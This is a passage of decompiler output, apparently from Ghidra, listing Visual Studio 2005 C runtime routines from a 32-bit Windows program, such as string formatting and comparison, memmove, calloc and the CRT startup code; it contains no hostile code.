    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar2) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar2;
        }
        iVar3 = __flsbuf(0,&local_24);
        if (iVar3 != -1) {
          return iVar2;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar2 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  return iVar2;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2005 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vsnprintf_helper(&DAT_004123e6,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
      if (iVar2 < 0) {
        *_DstBuf = '\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2005 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2005 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2005 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  __wcsicmp_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __wcsicmp_l(wchar_t *_Str1,wchar_t *_Str2,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int *piVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_Str1 == (wchar_t *)0x0) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar6 = 0x7fffffff;
  }
  else if (_Str2 == (wchar_t *)0x0) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar6 = 0x7fffffff;
  }
  else {
    if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
      do {
        wVar1 = *_Str1;
        if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
          wVar1 = wVar1 + L' ';
        }
        uVar8 = (uint)(ushort)wVar1;
        wVar2 = *_Str2;
        if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
          wVar2 = wVar2 + L' ';
        }
        _Str1 = _Str1 + 1;
        _Str2 = _Str2 + 1;
        uVar7 = (uint)(ushort)wVar2;
      } while ((wVar1 != L'\0') && (wVar1 == wVar2));
    }
    else {
      do {
        wVar3 = __towlower_l(*_Str1,&local_14);
        uVar8 = (uint)wVar3;
        _Str1 = _Str1 + 1;
        wVar4 = __towlower_l(*_Str2,&local_14);
        _Str2 = _Str2 + 1;
        uVar7 = (uint)wVar4;
        if (wVar3 == 0) break;
      } while (wVar3 == wVar4);
    }
    iVar6 = uVar8 - uVar7;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar6;
}



// Library Function - Single Match
//  __wcsicmp
// 
// Library: Visual Studio 2005 Release

int __cdecl __wcsicmp(wchar_t *_Str1,wchar_t *_Str2)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  int iVar4;
  
  if (DAT_00424238 == 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar4 = 0x7fffffff;
    }
    else {
      do {
        wVar1 = *_Str1;
        if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
          wVar1 = wVar1 + L' ';
        }
        wVar2 = *_Str2;
        if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
          wVar2 = wVar2 + L' ';
        }
        _Str1 = _Str1 + 1;
        _Str2 = _Str2 + 1;
      } while ((wVar1 != L'\0') && (wVar1 == wVar2));
      iVar4 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
    }
  }
  else {
    iVar4 = __wcsicmp_l(_Str1,_Str2,(_locale_t)0x0);
  }
  return iVar4;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2005 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  _sprintf_s
// 
// Library: Visual Studio 2005 Release

int __cdecl _sprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,...)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,&stack0x00000010);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040c328;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040c328:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2005 Release

int _xtow_s_20(uint param_1,uint param_2,uint param_3,int param_4)

{
  short *psVar1;
  short *in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  int iVar6;
  uint local_8;
  
  if (in_EAX == (short *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  if (param_2 == 0) {
LAB_0040c3ac:
    piVar2 = __errno();
    iVar6 = 0x16;
  }
  else {
    *in_EAX = 0;
    if ((param_4 != 0) + 1 < param_2) {
      if (0x22 < param_3 - 2) goto LAB_0040c3ac;
      psVar3 = in_EAX;
      if (param_4 != 0) {
        param_1 = -param_1;
        *in_EAX = 0x2d;
        psVar3 = in_EAX + 1;
      }
      local_8 = (uint)(param_4 != 0);
      psVar1 = psVar3;
      do {
        psVar4 = psVar1;
        sVar5 = (short)(param_1 % param_3);
        if (param_1 % param_3 < 10) {
          sVar5 = sVar5 + 0x30;
        }
        else {
          sVar5 = sVar5 + 0x57;
        }
        *psVar4 = sVar5;
        local_8 = local_8 + 1;
      } while ((param_1 / param_3 != 0) &&
              (psVar1 = psVar4 + 1, param_1 = param_1 / param_3, local_8 < param_2));
      if (local_8 < param_2) {
        psVar4[1] = 0;
        do {
          sVar5 = *psVar4;
          *psVar4 = *psVar3;
          *psVar3 = sVar5;
          psVar4 = psVar4 + -1;
          psVar3 = psVar3 + 1;
        } while (psVar3 < psVar4);
        return 0;
      }
      *in_EAX = 0;
    }
    piVar2 = __errno();
    iVar6 = 0x22;
  }
  *piVar2 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return iVar6;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_Val,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2005 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_004257fc == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_00425808)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_0040c58f();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_0040c544;
          }
        }
        else {
LAB_0040c544:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_00423eb4,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00424218 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_0040c58f(void)

{
  FUN_0040e37b(4);
  return;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2005 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int local_8;
  
  local_8 = 0;
  piVar2 = __calloc_impl(_Count,_Size,&local_8);
  iVar1 = local_8;
  if (((piVar2 == (int *)0x0) && (local_8 != 0)) && (piVar3 = __errno(), piVar3 != (int *)0x0)) {
    piVar3 = __errno();
    *piVar3 = iVar1;
  }
  return piVar2;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_0040c722:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_0040c72b:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        _memcpy(_Dst,_Src,_MaxCount);
        goto LAB_0040c722;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_0040c72b;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar1;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040c973_caseD_2;
        case 3:
          goto switchD_0040c973_caseD_3;
        }
        goto switchD_0040c973_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040c973_caseD_0;
      case 1:
        goto switchD_0040c973_caseD_1;
      case 2:
        goto switchD_0040c973_caseD_2;
      case 3:
        goto switchD_0040c973_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c973_caseD_2;
            case 3:
              goto switchD_0040c973_caseD_3;
            }
            goto switchD_0040c973_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c973_caseD_2;
            case 3:
              goto switchD_0040c973_caseD_3;
            }
            goto switchD_0040c973_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c973_caseD_2;
            case 3:
              goto switchD_0040c973_caseD_3;
            }
            goto switchD_0040c973_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040c973_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040c973_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040c973_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040c973_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_004257e4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040c7ec_caseD_2;
      case 3:
        goto switchD_0040c7ec_caseD_3;
      }
      goto switchD_0040c7ec_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040c7ec_caseD_0;
    case 1:
      goto switchD_0040c7ec_caseD_1;
    case 2:
      goto switchD_0040c7ec_caseD_2;
    case 3:
      goto switchD_0040c7ec_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c7ec_caseD_2;
          case 3:
            goto switchD_0040c7ec_caseD_3;
          }
          goto switchD_0040c7ec_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c7ec_caseD_2;
          case 3:
            goto switchD_0040c7ec_caseD_3;
          }
          goto switchD_0040c7ec_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c7ec_caseD_2;
          case 3:
            goto switchD_0040c7ec_caseD_3;
          }
          goto switchD_0040c7ec_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040c7ec_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040c7ec_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040c7ec_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040c7ec_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2005 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00423a18 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Removing unreachable block (ram,0x0040cb57)
// Library Function - Single Match
//  _check_managed_app
// 
// Library: Visual Studio 2005 Release

undefined4 _check_managed_app(void)

{
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2005 Release

int ___tmainCRTStartup(void)

{
  HANDLE pvVar1;
  LPOSVERSIONINFOA lpVersionInformation;
  BOOL BVar2;
  int iVar3;
  short *psVar4;
  uint uVar5;
  DWORD DVar6;
  SIZE_T dwBytes;
  _STARTUPINFOW local_74;
  DWORD local_2c;
  DWORD local_28;
  DWORD local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x40cb66;
  local_8 = 0;
  GetStartupInfoW(&local_74);
  local_8 = 0xfffffffe;
  dwBytes = 0x94;
  DVar6 = 0;
  pvVar1 = GetProcessHeap();
  lpVersionInformation = (LPOSVERSIONINFOA)HeapAlloc(pvVar1,DVar6,dwBytes);
  if (lpVersionInformation == (LPOSVERSIONINFOA)0x0) {
    _fast_error_exit(0x12);
  }
  else {
    lpVersionInformation->dwOSVersionInfoSize = 0x94;
    BVar2 = GetVersionExA(lpVersionInformation);
    DVar6 = 0;
    if (BVar2 != 0) {
      local_24 = lpVersionInformation->dwPlatformId;
      local_28 = lpVersionInformation->dwMajorVersion;
      local_2c = lpVersionInformation->dwMinorVersion;
      uVar5 = lpVersionInformation->dwBuildNumber & 0x7fff;
      pvVar1 = GetProcessHeap();
      HeapFree(pvVar1,DVar6,lpVersionInformation);
      if (local_24 != 2) {
        uVar5 = uVar5 | 0x8000;
      }
      _DAT_00423ec4 = local_28 * 0x100 + local_2c;
      DAT_00423ebc = local_24;
      DAT_00423ec8 = local_28;
      _DAT_00423ecc = local_2c;
      _DAT_00423ec0 = uVar5;
      local_24 = _check_managed_app();
      iVar3 = __heap_init();
      if (iVar3 == 0) {
        _fast_error_exit(0x1c);
      }
      iVar3 = __mtinit();
      if (iVar3 == 0) {
        _fast_error_exit(0x10);
      }
      __RTC_Initialize();
      local_8 = 1;
      iVar3 = __ioinit();
      if (iVar3 < 0) {
        __amsg_exit(0x1b);
      }
      DAT_00426944 = ___crtGetCommandLineW();
      DAT_00423a14 = ___crtGetEnvironmentStringsW();
      iVar3 = __wsetargv();
      if (iVar3 < 0) {
        __amsg_exit(8);
      }
      iVar3 = __wsetenvp();
      if (iVar3 < 0) {
        __amsg_exit(9);
      }
      iVar3 = __cinit(1);
      if (iVar3 != 0) {
        __amsg_exit(iVar3);
      }
      psVar4 = (short *)__wwincmdln();
      local_20 = FUN_004010a0((HINSTANCE)&IMAGE_DOS_HEADER_00400000,0,psVar4);
      if (local_24 != 0) {
        __cexit();
        return local_20;
      }
                    // WARNING: Subroutine does not return
      _exit(local_20);
    }
    pvVar1 = GetProcessHeap();
    HeapFree(pvVar1,DVar6,lpVersionInformation);
  }
  return 0xff;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00423b38 =
